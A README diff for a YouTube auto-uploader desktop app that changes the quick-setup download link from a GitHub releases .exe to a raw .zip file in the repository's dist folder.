@@ -4,7 +4,7 @@ An Electron desktop app that automatically uploads video files from a watched fo
 
 ## 📥 Quick Setup (Recommended)
 **No coding required.** Directly download the latest Windows installer:
-👉 **[Download Latest Ready Auto YT Setup (.exe)](https://github.com/ReadyZer0/Youtube-auto-uploader/releases/latest)**
+👉 **[Download Latest Ready Auto YT Setup (.zip)](https://github.com/ReadyZer0/Youtube-auto-uploader/raw/main/dist/ready-auto-yt-uploader-setup.zip)**
 
 ---
 
